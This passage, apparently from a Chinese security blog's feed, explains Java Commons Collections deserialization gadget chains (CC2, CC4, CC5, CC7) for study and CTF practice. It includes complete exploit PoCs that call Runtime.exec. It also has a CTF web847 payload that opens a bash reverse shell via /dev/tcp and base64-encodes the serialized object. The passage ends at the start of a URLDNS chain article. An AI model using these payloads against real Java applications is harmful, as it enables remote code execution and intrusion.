String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;)&#125;;ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);</code></pre><p>接下来去找哪调用了transform方法</p><p>这里调了TransformingComparator的compare方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323205535754.png" alt="image-20230323205535754"></p><p>这个transformer是可控的，构造函数里可以直接传</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323205601567.png" alt="image-20230323205601567"></p><p>然后去找一下哪里调了compare</p><p>在PriorityQueue类的siftDownUsingComparator方法里</p><p>这个虽然是私有的，但是在PriorityQueue类的readObject方法里调了heapify方法，heapify方法又调了siftDown，然后在siftDown里实现了对siftDownUsingComparator的调用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323210141383.png" alt="image-20230323210141383"></p><p>不过这里有两个if判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323211613218.png" alt="image-20230323211613218"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323211623496.png" alt="image-20230323211623496"></p><p>第一个if需要(size&gt;&gt;&gt;1)-1&gt;=0，为2就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323211825789.png" alt="image-20230323211825789"></p><p>然后这里调两次add，就可以实现让size为2的目的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323212049514.png" alt="image-20230323212049514"></p><p>这个comparator也可以控制，也是我们必须要写的参数，所以第二个if可以忽略了，（TransformingComparator实现了Comparator接口，所以这里边可以写TransformingComparator</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323210546768.png" alt="image-20230323210546768"></p><p>这里可以先写个poc了</p><pre class="language-java" data-language="java"><code class="language-java">public class cc2 &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer);        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator);        priorityQueue.add(1);        priorityQueue.add(1);        ser(priorityQueue);&#x2F;&#x2F;        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><h2 id="完善-2"><a href="#完善-2" class="headerlink" title="完善"></a>完善</h2><p>但是这里序列化的时候也弹计算器了，原因就是在第二次add的时候，不满足if判断进了siftUp里，然后在siftUp里也有个siftDownUsingComparator，导致提前执行了命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323212731526.png" alt="image-20230323212731526"></p><p>这里就要用我们熟悉的反射了</p><p>最终poc</p><pre class="language-java" data-language="java"><code class="language-java">package org.cc2;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class cc2 &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer);        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator);        Class aClass &#x3D; priorityQueue.getClass();        Field size &#x3D; aClass.getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(priorityQueue,2);&#x2F;&#x2F;        priorityQueue.add(1);&#x2F;&#x2F;        priorityQueue.add(1);        ser(priorityQueue);&#x2F;&#x2F;        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><p>这里计算器会弹两次，因为compare里调了两次transform</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>cc2的链挺短的，也挺简单</p><p>执行类是InvokerTransformer </p><p>入口类是PriorityQueue</p><p>调用链是</p><p>PriorityQueue.readObject</p><p>PriorityQueue.siftDownUsingComparator</p><p>TransformingComparator.compare</p><p>InvokerTransformer.transform</p><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>cc4像是cc2和cc3的缝合品</p><p>使用了cc3的加载字节码的执行方式，但是前半部分用了cc2的链子</p><p>所以这里不分析了，简单写一下调用链</p><h2 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h2><p>PriorityQueue.readObject</p><p>PriorityQueue.siftDownUsingComparator</p><p>TransformingComparator.compare</p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InstantiateTransformer.transform</p><p>TrAXFilter</p><p>TransformerImpl.newTransformer</p><p>TransformerImpl.getTransletInstance</p><p>TransformerImpl.defineTransletClasses</p><p>TransformerImpl.defineClass</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323214856492.png" alt="image-20230323214856492"></p><p>poc</p><pre class="language-java" data-language="java"><code class="language-java">package org.cc4;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class cc4 &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        TemplatesImpl templates &#x3D; new TemplatesImpl();        &#x2F;&#x2F; _name赋值不为null        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        name.set(templates,&quot;123&quot;);        &#x2F;&#x2F; _class赋值为null        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);        classField.setAccessible(true);        classField.set(templates,null);        &#x2F;&#x2F;加载恶意类的字节码        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));        &#x2F;&#x2F;转为二维数组        byte[][] codes &#x3D; &#123;code&#125;;        bytecodes.set(templates,codes);        &#x2F;&#x2F;_tfactory赋值        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);        tfactory.setAccessible(true);        tfactory.set(templates,new TransformerFactoryImpl());        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer);        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator);        Class aClass &#x3D; priorityQueue.getClass();        Field size &#x3D; aClass.getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(priorityQueue,2);        ser(priorityQueue);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5的环境又回到了CommonsCollections3</p><p>CommonsCollections1和CommonsCollections3因为AnnotaionInvocationHandler入口在jdk8中代码被修改了导致不能使用，所以CommonsCollections5换了一个入口，在调用链的构造中，也新加了一个TiedMapEntry作为中转。</p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>CC5的后半段就是从LazyMap.get到InvokerTransformer.transform</p><p>这里和LazyMap链一样就不细说了，这里就说说前半段，要找到调用get方法的类，在CC6里我们用的是TiredMapEntry类的getValue方法，在CC5里也是它，但是在CC6里用的是它的hashCode方法来调用getValue方法，而在CC5里用的是它的toString方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323220204497.png" alt="image-20230323220204497"></p><p>然后就去找有没有调用toString的（这个可太多了</p><p>在CC5里找的是BadAttributeValueExpException类的readObject方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323220540847.png" alt="image-20230323220540847"></p><p>这里简单说一下readObject里的内容，要想到toString，就要满足两个if判断，首先val不为空，其次判断valObj是否是String类的实例或者是子类实例，如果都不满足，就进入最后一个elseif里调用valObj.toString，所以这里让valObj为TiredMapEntry类的就行了，这个在实例化的时候可以赋值</p><p>理想poc</p><pre class="language-java" data-language="java"><code class="language-java">public class cc5 &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(tiedMapEntry);        ser(badAttributeValueExpException);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><h2 id="完善-3"><a href="#完善-3" class="headerlink" title="完善"></a>完善</h2><p>但是实际上上边的poc在序列化过程会执行命令，但是在反序列化过程中反而不会执行</p><p>原因就是在的构造函数里BadAttributeValueExpException</p><pre class="language-java" data-language="java"><code class="language-java">public BadAttributeValueExpException (Object val) &#123;    this.val &#x3D; val &#x3D;&#x3D; null ? null : val.toString();&#125;</code></pre><p>可以看到在构造的时候就已经调用了toString函数导致了命令执行，并且还改变了val的值，导致无法在反序列时执行</p><p>这里也是用反射，在实例化BadAttributeValueExpException对象时放个空值，然后再把里边的val值改了就行</p><p>最终poc</p><pre class="language-java" data-language="java"><code class="language-java">package org.cc5;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class cc5 &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(tiedMapEntry);        Class aClass &#x3D; badAttributeValueExpException.getClass();        Field declaredField &#x3D; aClass.getDeclaredField(&quot;val&quot;);        declaredField.setAccessible(true);        declaredField.set(badAttributeValueExpException,tiedMapEntry);        ser(badAttributeValueExpException);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>CC7的后半部分还是调用lazymap的get方法然后到InvokerTransformer.transform</p><p>但是与其他的cc链不同，cc7利用AbstractMap的equals方法来调用lazymap的get方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323230014807.png" alt="image-20230323230014807"></p><p>这里只要控制m是lazymap类的对象就可以了，这个m也就是我们传入的o</p><p>然后再去找调用了equals方法的类</p><p>cc7里用的是HashTable类的reconstitutionPut方法</p><p><img src="/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230323230621690.png" alt="image-20230323230621690"></p><p>这里的key是我们可控的，在HashTable的readObject方法里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323231044314.png" alt="image-20230323231044314"></p><p>这个key是从readObject方法里拿到的，那writeObject里应该也有</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323231233055.png" alt="image-20230323231233055"></p><p>这里的话他进行序列化，首先写入了table的长度以及table的元素个数，然后取出table中的元素，放入entryStack，这里其实就是栈，然后把栈里面的每个元素用writeObject写入。</p><p>很明显了，这里传递的实际上就是HashTable#put时添加进去的key和value。</p><p>那么也就是说key是可控的，key可控所以e.key.equals(key)也可控</p><p>那么m就是我们可控的，然后达到调用lazymap.get的目的</p><h2 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h2><p>虽然调用链已经弄清楚了，但是在编写poc之前还有几个要注意的地方</p><p><strong>1.如何进入reconstitutionPut的for循环中</strong></p><p>因为第一次put时table里是空的，不会进入for循环，而在第二次时，第一次的数据已经进入了table，这时候才会进入for循环</p><p>所以这里至少要put进两个不一样的LazyMap，就相当于有两个不一样的hashMap。（如果传入了相同的值，则 Hashtable#readObject 中的 elements 便会为 1，也就还是不会进入for循环</p><p><strong>2.如何满足e.hash == hash</strong></p><p>首先这里求hash的方法是key.hashCode()，key是我们的HashMap对象，也就是HashMap里的hashCode，可以跟一下最后调用的hashCode是这样的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324140606106.png" alt="image-20230324140606106"></p><p>Java的hashCode有点小bug</p><pre class="language-none"><code class="language-none">&quot;yy&quot;.hashCode() &#x3D;&#x3D; &quot;zZ&quot;.hashCode()</code></pre><p>所以只要让我们的hashMap的值分别为yy和zZ就能满足e.hash==hash然后去执行&amp;&amp;后面的 e.key.equals(key)了</p><p><strong>3.如何调用AbstractMap这个抽象类里的equals方法</strong></p><p>HashMap源码中的equals()定义是Entry类的，所以如果不是Entry类去调HashMap.equals，调用的其实就是它继承的AbstractMap抽象类里的equals</p><h2 id="完善-4"><a href="#完善-4" class="headerlink" title="完善"></a>完善</h2><p>弹了，但是没完全弹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324141012061.png" alt="image-20230324141012061"></p><p>在序列化之前出现了一个无法被反序列化的实例</p><p>根据经验，这个就是因为在构造的时候执行了一遍命令，让其中一个值成为了java.lang.ProcessImpl类型的。</p><p>不出意外的话，还是put问题，我们可以跟一下看看</p><p>果然，在put里调用了LazyMap的equals函数</p><p>但是LazyMap没equals，所以调用了它的父类AbstractMapDecorator里的equals</p><p><img src="/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230324141919251.png" alt="image-20230324141919251"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324142001699.png" alt="image-20230324142001699"></p><p>然后又调用了HashMap的equals方法，但是HashMap继承了AbstractMap抽象类，这个抽象类中有equals方法，所以就会调用</p><p>AbstractMap的equals方法，导致命令提前执行，并且会让hashmap2的key中就会增加一个yy键，而这个键的值为UNIXProcess这个类的实例：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324142852120.png" alt="image-20230324142852120"></p><p>而且在反序列化的时候AbstractMap抽象类的equals会在第三个if判断中会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞</p><p>所以还要remove掉hashmap2里多出的yy键值对</p><p>还有就是为了不让构造的时候就执行命令，用反射的方式改个值就行，最终payload</p><pre class="language-java" data-language="java"><code class="language-java">package org.cc7;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Hashtable;import java.util.Map;public class cc7 &#123;    public static void main(String[] args) throws Exception &#123;        Transformer transformerChain &#x3D; new ChainedTransformer(new Transformer[0]);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;),        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; hashMap1 &#x3D; new HashMap&lt;&gt;();        HashMap&lt;Object, Object&gt; hashMap2 &#x3D; new HashMap&lt;&gt;();        hashMap1.put(&quot;yy&quot;,1);        hashMap2.put(&quot;zZ&quot;,1);        Map decorate1 &#x3D; LazyMap.decorate(hashMap1, chainedTransformer);        Map decorate2 &#x3D; LazyMap.decorate(hashMap2, new ConstantTransformer(&quot;1&quot;));        Hashtable&lt;Object, Object&gt; objectObjectHashtable &#x3D; new Hashtable&lt;&gt;();        objectObjectHashtable.put(decorate1,1);        objectObjectHashtable.put(decorate2,1);        hashMap2.remove(&quot;yy&quot;);        Class&lt;? extends Map&gt; aClass &#x3D; decorate2.getClass();        Field factory &#x3D; aClass.getDeclaredField(&quot;factory&quot;);        factory.setAccessible(true);        factory.set(decorate2,chainedTransformer);        serialize(objectObjectHashtable);        unserialize();    &#125;    public static void serialize(Object obj) throws Exception&#123;        ObjectOutputStream oos&#x3D;new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static void unserialize() throws Exception&#123;        ObjectInputStream ois&#x3D;new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        ois.readObject();    &#125;&#125;</code></pre><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>作为最后一个CC链，CC7的入口类是Hashtable，执行类依旧是InvokerTransformer</p><p>调用链</p><p>Hashtable.readObject</p><p>Hashtable.reconstitutionPut</p><p>AbstractMap.equals</p><p>LazyMap.get</p><p>InvokerTransformer.transform</p><h1 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h1><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/1.png" alt="image-20230324142852121"></p><p>对于反序列化来说，在调用链上的每个方法看起来是独立的，却又相互联系，通过不同的组合形成能够形成各种不同调用链</p><p>其中比较重要的是</p><p>CC2和CC3属于4.0环境</p><p>其余的属于3.0+版本，</p><p>其中高版本也可用的CC6和4.0版本的CC2是比较重要的</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="web847"><a href="#web847" class="headerlink" title="web847"></a>web847</h2><p>题目环境中，没有nc和curl命令，但是有bash，所以反弹shell</p><p>Java7的环境，使用了<strong>commons-collections 3.1</strong>的库</p><p>所以用CC1就行</p><p>把序列化内容写入输出流里，然后base64输出</p><pre class="language-java" data-language="java"><code class="language-java">public class Main &#123;    public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException &#123;        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot;&#125;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);&#x2F;&#x2F;        InvokerTransformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        HashMap map &#x3D; new HashMap();        map.put(&quot;value&quot;,&quot;value&quot;);        Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer);&#x2F;&#x2F;        &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象        Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        &#x2F;&#x2F;获取构造方法        Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate);        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        byte[] buf &#x3D; byteArrayOutputStream.toByteArray();        &#x2F;&#x2F; base64编码        Base64.Encoder encoder &#x3D; Base64.getEncoder();        String base64 &#x3D; encoder.encodeToString(buf);        System.out.println(base64);    &#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230326140124579.png" alt="image-20230326140124579"></p><h2 id="web848"><a href="#web848" class="headerlink" title="web848"></a>web848</h2><p>在847的基础上禁止了TransformedMap类</p><p>换成LazyMap就行，一样的东西</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230326141149441.png" alt="image-20230326141149441"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS链</title>
      <link href="/2023/03/18/URLDNS%E9%93%BE/"/>
      <url>/2023/03/18/URLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>基础的理论写在这里了，这篇主要是跟一下URLDNS链</p><p><a href="https://ethe448.github.io/2023/03/16/Java/#toc-heading-14">Java | Ethe&#39;s blog (ethe448.github.io)</a></p><h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><p>反序列化分三个部分</p><p>入口类、调用链和执行类</p><p>接下来将对其依次进行分析</p><h2 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h2><p>这里的入口类是HashMap</p><p>首先HashMap里重写了readObject</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318175144585.png" alt="image-20230318175144585"></p><p>在最后的地方</p><p>将对象中的内容一个一个拿了出来然后调用了putVal函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318175200362.png" alt="image-20230318175200362"></p><p>这个函数具体的可以看这个<a href="https://blog.csdn.net/ljf199701/article/details/106309417/">HashMap中的putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict)解读_余韵啊的博客-CSDN博客</a></p><p>简单来说就是判断传入的内容的key的值是不是相等，不相等就加进map里，相等就覆盖</p><p>这里对key调用了hash函数，跟进去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318175918432.png" alt="image-20230318175918432"></p><p>又调用了key自身的hashCode函数</p><p>这个hashCode是Object自带的，所以HashMap满足我们入口类的三个条件（重写了readObject，参数类型宽泛，jdk自带）</p><p>所以接下来考虑有没有可能存在某个特殊的类**<code>M</code><strong>，其</strong><code>hashCode</code>**方法中直接或间接可调用危险函数，当M是key时，调用key.hashCode()，就相当于调用了M.hashCode()，从而触发危险函数。</p><h2 id="执行类"><a href="#执行类" class="headerlink" title="执行类"></a>执行类</h2><p>接下来我们再来看执行类</p><p>这里执行类就是URL类</p><p>跟进去找URL的hashCode方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318180244597.png" alt="image-20230318180244597"></p><p>如果hashCode这个参数为-1，也就是初始值时，会调用handler的hashCode方法。</p><p>这里看一下handler是个什么东西</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318181515789.png" alt="image-20230318181515789"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318183016507.png" 